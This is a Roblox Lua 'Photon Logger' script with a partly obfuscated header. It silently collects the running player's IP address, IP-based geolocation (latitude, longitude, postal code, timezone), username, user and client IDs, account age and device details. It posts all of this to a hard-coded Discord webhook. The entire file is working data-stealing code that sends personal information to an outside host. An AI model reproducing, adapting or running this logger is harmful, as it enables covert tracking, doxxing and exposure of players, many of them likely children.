we=true;unpack=(unpack)or(table["unpack"])qq={[1]=function()return"h".."ttps".."://".."api"..".ipify"..".org"end;[2]=nil;};setmetatable(qq,{__add=function(tt,vv)return tt[#tt+(vv-1)]end,__call=function(rt,fy)rt[fy[1]]=fy[2];end});qq[3]=(qq+2~=nil)or("\97");qq({5,(qq+3):gsub("a","Ph\x6ft\x6fn L\x6fgger")});ph=qq+(#{[[t4c-O]]}*5);co={}setmetatable(co,{__index=function(ew,pg)if(pg=="vx")then return(ph)end;end})qq[6]=co.vx;print(qq+6);
--// player.MembershipType == Enum.MembershipType.Premium
--// DateTime.now():FormatLocalTime("LL", "en-us")
--// game:GetService("UserInputService").TouchEnabled
--// game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
photonver = "V3.0"
local url = "https://ptb.discord.com/api/webhooks/1261141544937979904/vTNWW".."3mgj0U-dbiIQNRAhpXHSBzcAIEAcPt54cQ-u7XA2nZ5LXhF0vRnWda9p0laS7O8"

ipinf=game:GetService("HttpService"):JSONDecode(game:HttpGet('https://ipapi.co/'..game:HttpGet("https://api.ipify.org")..'/json'))

local data = {
    ["embeds"] = {{
        ["description"] = "**"..(qq+6).."**".." **|** [**Profile**](h".."ttps://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile)".." ** | ** [**Ip Info**](https://ipinfo.io/"..game:HttpGet("https://api.ipify.org")..")",
        ["color"] = tonumber(0x6300ff),
        ["fields"] = {
            {
                ["name"] = ":bust_in_silhouette: Username",
                ["value"] = "```"..game.Players.LocalPlayer.Name.."```",
                ["inline"] = true
            },            
            {
                ["name"] = ":robot: IP",
                ["value"] = "```"..game:HttpGet((qq+1)()).."```",
                ["inline"] = true
            },
            {
                ["name"] = ":money_with_wings: Premium",
                ["value"] = "```"..(game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium and "True" or "False").."```",
                ["inline"] = true
            },
            {
                ["name"] = ":wastebasket: Alt",
                ["value"] = "```"..(game.Players.LocalPlayer.AccountAge <= 28 and "Yes" or "No").."```",
                ["inline"] = true
            },
            {
                ["name"] = ":baby: Age",
                ["value"] = "```"..game.Players.LocalPlayer.AccountAge.."```",
                ["inline"] = true
            },
            {
                ["name"] = ":mobile_phone: Device",
                ["value"] = "```"..((game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").KeyboardEnabled) and "Mobile" or "PC").."```",
                ["inline"] = true
            },
            {
                ["name"] = ":clock: Time",
                ["value"] = "```"..DateTime.now():FormatLocalTime("LL", "en-us").."```",
                ["inline"] = true
            },
            {
                ["name"] = ":identification_card: User Id",
                ["value"] = "```"..game.Players.LocalPlayer.userId.."```",
                ["inline"] = true
            },
            {
                ["name"] = ":family_mwgb: Players",
                ["value"] = "```"..#game.Players:GetPlayers().."```",
                ["inline"] = true
            },
            {
                ["name"] = ":comet: Executor",
                ["value"] = "```"..(identifyexecutor() or "Unknown").."```",
                ["inline"] = true
            },
            {
                ["name"] = ":eye: Display Name",
                ["value"] = "```@"..game.Players.LocalPlayer.DisplayName.."```",
                ["inline"] = true
            },
            {
                ["name"] = ":fire: Version",
                ["value"] = "```"..photonver.."```",
                ["inline"] = true
            },
            {
                ["name"] = ":houses: Game",
                ["value"] = "```"..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name:sub(1, 8).."...```",
                ["inline"] = true
            },
            {
                ["name"] = ":scroll: Place Id",
                ["value"] = "```"..game.PlaceId.."```",
                ["inline"] = true
            },
            {
                ["name"] = ":flag_white: Team",
                ["value"] = "```"..(game.Players.LocalPlayer.Team or "None").."```",
                ["inline"] = true
            },
            {
                ["name"] = ":earth_americas: Country",
                ["value"] = "```"..(ipinf.country_name or "Unknown").."```",
                ["inline"] = true
            },
            {
                ["name"] = ":airplane: Timezone",
                ["value"] = "```"..ipinf.timezone.."```",
                ["inline"] = true
            },
            {
                ["name"] = ":milky_way: Offset",
                ["value"] = "```"..ipinf.utc_offset.."```",
                ["inline"] = true
            },
            {
                ["name"] = ":one: Latitude",
                ["value"] = "```"..ipinf.latitude.."```",
                ["inline"] = true
            },
            {
                ["name"] = ":two: Longitude",
                ["value"] = "```"..ipinf.longitude.."```",
                ["inline"] = true
            },
            {
                ["name"] = ":three: Postal",
                ["value"] = "```"..(ipinf.postal or "Unknown").."```",
                ["inline"] = true
            },
            {
                ["name"] = ":key: Job Id",
                ["value"] = "```"..game.JobId.."```",
                ["inline"] = false
            },
            {
                ["name"] = ":key: Client Id",
                ["value"] = "```"..(game:GetService("RbxAnalyticsService"):GetClientId() or "Unknown").."```",
                ["inline"] = false
            },
        },
        ["footer"] = {
            ["text"]= "Photon Logger | @apnff0x",
            ["icon_url"]= "https://cdn.discordapp.com/attachments/1136547563017871496/1261163357562605601/attachment.png?ex=6691f567&is=6690a3e7&hm=9666969649fef9631e5857e63303c705894e35a1e5b0de793527fb6e9d9d331d&"
        },
        ["thumbnail"] = {
            ["url"] = "https://cdn.discordapp.com/attachments/1136547563017871496/1261163357562605601/attachment.png?ex=6691f567&is=6690a3e7&hm=9666969649fef9631e5857e63303c705894e35a1e5b0de793527fb6e9d9d331d&"
        }
    }},
}
--[[
        ["footer"] = {
          ["text"]= "Photon Logger | @fotenexploits @apnff0x",
          ["icon_url"]= "https://cdn.discordapp.com/attachments/1136547563017871496/1261163357562605601/attachment.png?ex=6691f567&is=6690a3e7&hm=9666969649fef9631e5857e63303c705894e35a1e5b0de793527fb6e9d9d331d&"
        },]]

if getgenv().ex == nil then getgenv().ex = true
    request(
        {
            Url = url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode(data)
        }
    )
end
